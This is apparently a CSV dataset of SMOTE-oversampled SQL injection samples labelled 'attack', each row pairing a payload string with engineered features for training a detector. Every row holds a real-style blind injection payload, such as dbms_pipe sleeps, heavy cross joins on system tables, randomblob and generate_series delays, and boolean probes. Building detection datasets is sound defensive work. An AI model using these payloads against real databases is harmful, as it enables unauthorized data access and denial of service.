id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000150,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000251,0.2582891441288214,156.37871556656523,33.0,4.0983955078435255,74.0,18.0,44.0388990570559,20.33981650950932,0.47341998257942136,0.11515621197877818,0.28136179724896626,0.13006200819283417,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.339816509509317,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000042,0.14671763647123662,151.34902175199056,31.873082999276157,3.7963603413513582,46.77789524873328,16.253834001447682,60.38075100217152,27.936541499638082,0.3092166691282466,0.10729885480282689,0.3988452332682718,0.18463924280065466,3.873082999276158,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.063458500361921,0.0,2.0,1.0,8.0,0.9682707498190395,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0317292501809605,0.9682707498190395,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R000295,0.16155073473319975,134.60579232491423,34.97115274643266,4.263989048411529,55.02884725356735,17.913458239297967,39.57694507134689,22.086541760702033,0.4090297040976284,0.133245023698482,0.29362950115016023,0.16409577105372938,7.884610985730622,0.11538901426937842,0.9711527464326555,0.0,0.0,2.0,0.0,4.115389014269378,1.9999999999999998,0.0,0.0,6.971152746432656,1.0,0.028847253567344466,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0288472535673445,0.9711527464326555,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000153,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,0.7375917441157807,105.6527827020627,33.0,3.764560070064682,31.782405765979103,15.0,42.87037693608359,16.0,0.30090507574619046,0.14199367367452023,0.4056413319931344,0.15145991858615493,2.0,0.7824057659791025,2.0,1.0,0.0,1.0,0.0,8.217594234020897,0.0,0.0,1.0,4.0,1.0,0.7824057659791024,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7824057659791025,0.21759423402089748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000154,attack,boolean,"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000118,1.5457737982533792,146.05739983952807,32.45976362177528,4.136239730704525,70.29881810887639,18.0,38.75858173065168,19.0,0.4813470588028958,0.12341203820868302,0.2649726404348113,0.13026826255360988,0.5402363782247206,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.459763621775279,0.0,5.0,4.0,5.0,0.5402363782247208,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5402363782247208,0.4597636217752793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000155,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000257,0.655464847318159,64.30221990354579,23.697780096454217,3.6362428506832836,11.0,21.0,24.0,8.302219903545785,0.17107586083197027,0.326599370679216,0.37325642363338973,0.12906834485542404,0.3022199035457849,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,3.0,0.0,0.0,1.0,4.0,0.3022199035457849,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.5342402026664865,153.61198301367415,35.72239660273483,4.218260256297952,63.96319547031311,18.0,49.407988675782775,22.240798867578278,0.4166434097246664,0.11737310326278243,0.3210680848373629,0.14491540217518828,4.0,4.0,1.0,0.0,0.0,1.7592011324217227,0.0,6.481597735156555,0.0,0.0,0.0,6.7592011324217225,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000157,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000116,0.49068854965960224,129.34462362234945,32.59022769806167,3.807374058204781,39.55765335826722,15.0,50.59022769806167,24.196742566020554,0.30466828999415807,0.11626321709761119,0.3916715234120489,0.1873969694961818,0.1967425660205553,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,11.0,0.0,2.0,1.0,9.0,0.19674256602055507,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000158,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000136,0.5789553945571313,86.58803112398485,22.996675312218017,3.224435225873296,14.39534543710522,16.0,41.59468049954882,14.59800518733081,0.16487764125825244,0.18592287987787695,0.48059611553180936,0.16860336333206122,0.0,4.0,1.0,0.0,0.8006649375563972,2.0,0.0,6.3986701248872055,0.0,0.19933506244360277,0.199335062443603,3.8006649375563972,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000205,1.214869988272503,156.70152903944842,36.81450414849263,4.193054391164138,66.11087811136947,17.110878111369473,51.665268668216825,21.81450414849263,0.4241668853232878,0.1092089080144168,0.32744004313236974,0.13918416352992571,4.0,4.0,0.7036260371231572,0.0,0.0,1.2963739628768427,0.0,6.814504148492629,0.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.296373962876843,0.7036260371231572,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000160,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000177,0.0504767419977459,120.42629200949756,31.0,3.507380736890266,38.0,10.0,53.34103360759805,19.085258401899512,0.3155867269092728,0.08304913866033495,0.44288870376055967,0.15847543066983252,5.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.085258401899512,1.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000125,1.1407785020590056,123.72541283627055,29.72711773635588,4.116430471877497,75.0,5.0,27.27117736355879,16.45423547271176,0.6073669316863888,0.04049112877909258,0.21921788018376243,0.13292405935075619,2.181353209067638,0.818646790932362,0.0,0.0,1.0,0.0,0.0,3.454235472711759,0.0,5.0,4.0,1.0,0.7271177363558793,0.2728822636441207,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000066,0.5163838483517572,72.86590734326187,18.173181468652373,2.759693092013303,5.692725874609501,12.173181468652373,40.0,15.0,0.07765994340829263,0.1670415183304164,0.5493080278263934,0.20599051043489755,0.0,4.0,0.8268185313476265,0.0,0.0,2.0,0.0,6.0,1.9999999999999998,0.0,0.17318146865237338,2.8268185313476266,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1731814686523734,0.8268185313476265,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000163,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.21323165186538864,150.9252725801083,35.0,4.2221768182734944,62.62989096795668,18.37010903204332,47.925272580108306,22.0,0.41553692049594815,0.1215239783672372,0.3170707088529865,0.14586839228382814,4.0,3.8149454839783385,1.0,0.0,0.0,2.0,0.0,6.185054516021661,0.0,0.0,0.0,7.0,1.0,0.9537363709945847,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000164,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,0.9091803551548137,129.30236187843073,30.831397617401922,3.6202446240268618,46.67440953039232,10.0,54.302361878430744,18.325590469607686,0.3624029135060065,0.07751935614000083,0.41860482894999385,0.14147290140399885,5.0,1.1102230246251565e-16,0.0,1.0,0.0,0.8313976174019213,0.0,10.494192852205764,0.0,0.0,1.0,1.831397617401921,1.0,0.0,0.0,0.0,0.0,0.8313976174019212,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000312,0.9348083068482281,129.9838368288191,28.53225578858794,3.38225371370994,40.12902315435176,13.0,61.322557885879405,15.53225578858794,0.309185826136557,0.10111263532473917,0.46962665936717496,0.1200748791715289,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,9.064511577175882,0.4677442114120595,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000166,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000149,0.25473150012935103,149.92625426030708,32.490781782538384,4.122733184768392,70.94469069523029,18.0,40.98156356507677,20.0,0.47300033587452156,0.12014443263273762,0.27336141745636566,0.13349381403637514,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000167,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000103,0.05046336187843509,83.0,21.804871429249946,3.198231809522371,17.000000000000004,13.0,40.0,13.0,0.20481927710843373,0.1566265060240964,0.4819277108433735,0.1566265060240964,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000302,0.09737425846921607,86.94189754734715,26.92945983648981,3.807917743604883,19.57675901893886,24.0,31.43567869191848,11.929459836489809,0.22476912246570308,0.27668033294888983,0.3611766817206908,0.13737386286471628,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.92945983648981,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,0.1208157152385218,112.63680690584611,33.0,3.901255950157156,36.31840345292306,21.0,41.31840345292306,14.0,0.3223456320648706,0.18653708633188593,0.3667592240486529,0.1243580575545906,0.946932757846157,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,6.053067242153843,0.0,1.0,1.0,5.0,0.946932757846157,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000170,attack,boolean,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R000097,1.0424912746421566,120.47786367939871,26.248418834242766,3.905276002548078,64.23576950818489,8.757905828786175,31.49051300545659,15.993675336971059,0.5329129956504803,0.07371934136973939,0.26098089066721863,0.13238677231256168,0.0,0.7452565027282945,0.0,0.0,1.0,1.0,0.0,4.248418834242765,0.0,5.0,4.0,2.0,0.0,0.2484188342427647,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.24841883424276479,0.7515811657572351,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.9900413207790117,127.0,28.504634159580647,4.011684113680013,75.0,5.0,30.0,17.0,0.5905511811023622,0.039370078740157494,0.23622047244094488,0.13385826771653545,0.7569512393709715,2.243048760629028,0.0,0.0,1.0,0.0,0.0,4.0,0.0,5.0,4.0,1.0,0.25231707979032375,0.7476829202096762,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,boolean,"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000052,0.9804385439266082,129.7835877551459,31.214122135011223,4.070146364360447,65.99770989015713,10.0,34.0,19.785877864988777,0.5076120994080857,0.07717458506459735,0.262393589219631,0.15281972630768595,0.0,1.6423664050336713,1.5717557299775526,0.0,1.0,1.0,0.0,4.785877864988776,0.7858778649887761,5.0,4.0,3.5717557299775526,0.0,1.0,0.7858778649887761,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.2141221350112238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2141221350112237
SMOTE_000173,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000215,0.41278204735960083,113.41571797665951,31.792141011670246,3.7029767481404514,39.662871906638024,10.0,46.16856404668099,17.584282023340496,0.3495272983714533,0.08817566912146249,0.40719576701592575,0.1551012654911585,2.0,3.0,0.0,1.0,0.0,1.0,0.0,8.792141011670246,0.7921410116702473,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,0.011604346227567564,109.93790194197287,28.993463362312934,3.4586878537775534,31.0,13.0,48.95424353619054,16.983658405782336,0.2820104934863977,0.11826246501042484,0.44525570367875006,0.15447133782442737,0.0,0.996731681156467,2.0,0.0,1.0,1.0,0.0,8.990195043469402,0.996731681156467,1.0,1.0,4.0,0.0,0.9967316811564673,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000175,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,0.4381446469774678,157.58137981049748,35.0,4.133503387158324,78.61626988802125,16.0,46.30231993109,16.66278999138625,0.49847128659683043,0.10200033579283915,0.2935111327787867,0.1060172448315437,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.66278999138625,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000176,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000077,1.9530341648041147,128.72491202192765,27.817844574561093,3.431925319555226,42.0,13.0,58.90706744736656,14.817844574561093,0.32719445107584355,0.10127447295204679,0.4564965905193753,0.1150344854527344,1.635689149122185,2.3643108508778155,0.0,0.0,0.0,2.0,0.0,8.817844574561093,0.0,0.0,0.0,2.0,0.40892228728054625,0.5910777127194538,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000177,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000161,0.24513520334612487,79.58771137950181,27.13270314766676,3.8774204794449045,34.18960193650153,8.0,25.39810944300028,12.0,0.42518949674950296,0.10157840449663967,0.3208644920088979,0.1523676067449595,2.86729685233324,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.0,0.93364842616662,0.9336484261666201,1.06635157383338,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000178,attack,boolean,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000188,0.40799544102127216,137.5729927475087,31.28467150166088,3.9722868040567234,71.85766424916956,8.14233575083044,40.43065699667824,17.14233575083044,0.5223350611145879,0.0592087166738879,0.2938238305364327,0.12463239167509142,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.85766424916956,1.0,0.0,2.14233575083044,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8576642491695601,0.14233575083043998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,0.8512322571862805,126.62030936660953,31.08020624440635,4.267056073187915,78.16041248881271,4.919793755593647,29.459896877796822,14.080206244406353,0.6169895011039488,0.039142697441697544,0.2328943281715111,0.11097347328284261,0.0,2.3101546833047646,0.0,0.0,1.0,1.0,0.0,3.2299484388984117,0.0,0.0,2.7700515611015883,2.0,0.0,0.7700515611015881,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
